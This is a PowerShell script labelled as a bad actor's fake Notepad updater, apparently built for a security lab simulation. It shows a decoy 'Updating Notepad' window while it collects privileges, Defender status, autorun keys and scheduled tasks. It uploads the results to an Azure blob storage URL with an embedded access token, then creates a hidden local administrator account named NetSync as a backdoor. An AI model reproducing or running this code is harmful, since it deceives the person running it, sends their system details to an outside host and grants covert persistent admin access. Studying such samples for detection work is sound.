
### Bad Actor - Notepad_updater.ps1 script

#--------------Fake notepad updater---------------

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# === GUI Setup ===
$form = New-Object System.Windows.Forms.Form
$form.Text = "Notepad Update"
$form.Size = '300,150'
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Updating Notepad..."
$statusLabel.AutoSize = $true
$statusLabel.Location = '50,50'
$form.Controls.Add($statusLabel)

$form.Show()
[System.Windows.Forms.Application]::DoEvents()

Start-Sleep -Seconds 5

$statusLabel.Text = "Notepad successfully updated"
[System.Windows.Forms.Application]::DoEvents()

# === Launch Notepad ===
Start-Process notepad.exe

# === Hold & Close GUI ===
Start-Sleep -Seconds 3
$form.Close()



#--------------------Gathering of host information-------
# Recon.ps1 — Simulated Adversary Recon
$HostProfile = @{}

# 👤 User and Privilege Context
$HostProfile.Username     = $env:USERNAME
$HostProfile.Groups       = whoami /groups
$HostProfile.Privileges   = whoami /priv

# 🖥️ System Info
$HostProfile.OS           = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
$HostProfile.Arch         = (Get-CimInstance Win32_Processor).Architecture
$HostProfile.Domain       = (Get-CimInstance Win32_ComputerSystem).Domain
$HostProfile.IsDomainJoined = ((Get-WmiObject Win32_ComputerSystem).PartOfDomain)

# 🔒 Defender & AV Status
$Defender = Get-MpComputerStatus
$HostProfile.DefenderEnabled   = $Defender.AntivirusEnabled
$HostProfile.RealTimeProtection = $Defender.RealTimeProtectionEnabled

# ⚙️ Startup Opportunities
$RunKeys = @()
$RunKeys += Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
$RunKeys += Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -ErrorAction SilentlyContinue
$HostProfile.RegistryRunKeys = $RunKeys

# 📅 Scheduled Tasks (basic visibility)
$Tasks = schtasks /query /fo LIST /v
$HostProfile.ScheduledTasks = $Tasks

# 🌐 Network Reachability
$TestConn = Test-NetConnection -ComputerName "bing.com" -Port 443
$HostProfile.CanReachInternet = $TestConn.TcpTestSucceeded

# 💾 Write Results
$OutputPath = "$env:TEMP\ReconResults.json"
$HostProfile | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputPath

Write-Host "Recon completed. Results written to $OutputPath"



#------------------------Exfiltration-----------------------
#Exfiltration of host information

# Set file and target blob info
$localPath = "C:\Users\jonUser\AppData\Local\Temp\ReconResults.json"


# Combine full URL
$blobUrl = "https://guyxstorage.blob.core.windows.net/guyxcontainer/recon.json?sp=racw&st=2025-07-15T15:13:52Z&se=2025-07-22T23:28:52Z&spr=https&sv=2024-11-04&sr=c&sig=%2F61aXUyjFSn%2FSrvBHu82IThez1ZEYHELPxojYdVyy74%3D"
# Upload using Invoke-RestMethod
try {
    $headers = @{ "x-ms-blob-type" = "BlockBlob" }

    $fileContent = Get-Content -Path $localPath -Raw

    Invoke-RestMethod -Uri $blobUrl -Method Put -Headers $headers -Body $fileContent

    Write-Host "Upload successful: $localPath → $blobUrl"
} catch {
    Write-Warning "Upload failed: $_"
}

#--------------------------Create Hidden Credentials----------------------------

#Silently create new credentials for remote access
$username = "NetSync"
$password = "P@ssw0rd123!"
$fullName = "System Sync Service"
$description = "Handles background telemetry sync tasks"

try {
    # Create secure password object
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force

    # Create hidden local account
    New-LocalUser -Name $username -Password $securePassword -FullName $fullName -Description $description -ErrorAction Stop
    Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction Stop

    # Define registry path
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

    # Create key if missing
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }

    # Set user to be hidden from login screen
    New-ItemProperty -Path $regPath -Name $username -Value 0 -PropertyType DWORD -Force | Out-Null

    Write-Host "User '$username' created and hidden successfully."
}
catch {
    Write-Warning "Something went wrong: $_"
} 
